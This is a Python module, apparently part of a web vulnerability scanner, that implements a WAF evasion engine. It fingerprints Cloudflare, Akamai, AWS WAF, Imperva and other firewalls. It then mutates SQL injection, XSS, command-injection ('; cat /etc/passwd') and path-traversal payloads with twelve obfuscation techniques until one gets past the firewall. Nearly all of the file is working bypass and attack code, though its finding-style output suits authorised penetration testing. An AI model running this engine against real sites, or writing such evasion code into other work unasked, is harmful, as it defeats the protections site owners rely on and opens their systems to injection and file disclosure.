#  MODULE 6 — ADVANCED WAF EVASION ENGINE
#  Multi-technique bypass · Fingerprinting · Adaptive evasion
# ════════════════════════════════════════════════════════════════════════

class AdvancedWAFEvasionEngine:
    WAF_SIGNATURES = {
        "cloudflare": {"headers": ["cf-ray", "cf-cache-status"], "body": ["cloudflare", "ray id"]},
        "akamai": {"headers": ["x-akamai-transformed", "akamai-grn"], "body": ["akamai"]},
        "aws_waf": {"headers": ["x-amzn-requestid"], "body": ["aws", "request blocked"]},
        "imperva": {"headers": ["x-cdn", "x-iinfo"], "body": ["incapsula", "imperva"]},
        "f5_bigip": {"headers": ["x-wa-info", "bigipserver"], "body": ["f5", "bigip"]},
        "modsecurity": {"headers": [], "body": ["mod_security", "modsecurity", "not acceptable"]},
        "sucuri": {"headers": ["x-sucuri-id"], "body": ["sucuri", "cloudproxy"]},
        "fortinet": {"headers": ["fortigate", "fortiWeb"], "body": ["fortiguard", "fortigate"]},
        "barracuda": {"headers": ["barra_counter_session"], "body": ["barracuda"]},
    }

    EVASION_TECHNIQUES = {
        "case_variation": lambda p: "".join(c.upper() if i % 2 else c for i, c in enumerate(p)),
        "null_byte": lambda p: p.replace(" ", "%00"),
        "comment_inline": lambda p: p.replace(" ", "/**/"),
        "unicode_escape": lambda p: "".join(f"\\u{ord(c):04x}" if c in "<>'\"\\" else c for c in p),
        "hex_encode": lambda p: "".join(f"%{ord(c):02x}" if not c.isalnum() else c for c in p),
        "double_encode": lambda p: quote(quote(p)),
        "newline_inject": lambda p: p.replace(" ", "\r\n"),
        "tab_substitute": lambda p: p.replace(" ", "\t"),
        "concat_break": lambda p: p.replace("SELECT", "SEL"+"ECT").replace("UNION", "UN"+"ION"),
        "html_entity": lambda p: "".join(f"&#{ord(c)};" if c in "<>'\"\\" else c for c in p),
        "overlong_utf8": lambda p: p.replace("<", "%C0%BC").replace(">", "%C0%BE"),
        "parameter_pollution": lambda p: f"{p}&_={secrets.token_hex(4)}",
    }

    def __init__(self, client):
        self._client = client
        self._waf_type = "unknown"

    async def scan(self, target: str) -> list:
        results = []
        self._waf_type = await self._fingerprint_waf(target)
        if self._waf_type != "none":
            results.append(Finding(
                plugin="AdvancedWAFEvasion",
                title=f"WAF Detected: {self._waf_type.upper()}",
                severity="INFO",
                description=f"Web Application Firewall identified: {self._waf_type}",
                confidence=90.0, url=target,
                tags=["waf-evasion", "fingerprint"],
            ))
        test_payloads = [
            ("sqli", "' OR '1'='1"), ("xss", "<script>alert(1)</script>"),
            ("cmd", "; cat /etc/passwd"), ("traversal", "../../etc/passwd"),
        ]
        for attack_type, base_payload in test_payloads:
            bypass_result = await self._try_evasion(target, base_payload, attack_type)
            if bypass_result:
                results.append(bypass_result)
        return results

    async def _fingerprint_waf(self, target: str) -> str:
        try:
            resp = await self._client.request("GET", target)
            if resp:
                headers = {k.lower(): v for k, v in (resp.headers.items() if hasattr(resp, "headers") else [])}
                body = (resp.text if hasattr(resp, "text") else str(resp)).lower()
                for waf_name, sigs in self.WAF_SIGNATURES.items():
                    for hdr in sigs["headers"]:
                        if hdr.lower() in headers:
                            return waf_name
                    for bpat in sigs["body"]:
                        if bpat.lower() in body:
                            return waf_name
            blocked_resp = await self._client.request("GET", target + "?test=<script>alert(1)</script>")
            if blocked_resp:
                status = blocked_resp.status if hasattr(blocked_resp, "status") else 200
                if status in (403, 406, 429, 503):
                    return "generic_waf"
        except Exception:
            pass
        return "none"

    async def _try_evasion(self, target: str, payload: str, attack_type: str):
        techniques_priority = list(self.EVASION_TECHNIQUES.keys())
        if self._waf_type == "cloudflare":
            techniques_priority = ["unicode_escape", "double_encode", "overlong_utf8"] + techniques_priority
        elif self._waf_type == "modsecurity":
            techniques_priority = ["comment_inline", "case_variation", "concat_break"] + techniques_priority
        for tech_name in techniques_priority[:8]:
            tech_func = self.EVASION_TECHNIQUES.get(tech_name)
            if not tech_func:
                continue
            try:
                evasion_payload = tech_func(payload)
                test_url = f"{target}?waf_test={quote(evasion_payload)}"
                resp = await self._client.request("GET", test_url)
                if resp:
                    status = resp.status if hasattr(resp, "status") else 0
                    if status == 200:
                        body = resp.text if hasattr(resp, "text") else str(resp)
                        if evasion_payload in body or any(
                            re.search(pat, body) for pat in [r"(?i)sql.*syntax", r"uid=\d+", r"root:"]
                        ):
                            return Finding(
                                plugin="AdvancedWAFEvasion",
                                title=f"WAF Bypass: {tech_name} ({attack_type})",
                                severity="HIGH",
                                description=f"WAF ({self._waf_type}) bypassed using {tech_name} technique for {attack_type}",
                                confidence=80.0, url=test_url, payload=evasion_payload,
                                tags=["waf-evasion", "bypass", attack_type],
                            )
            except Exception:
                continue
        return None


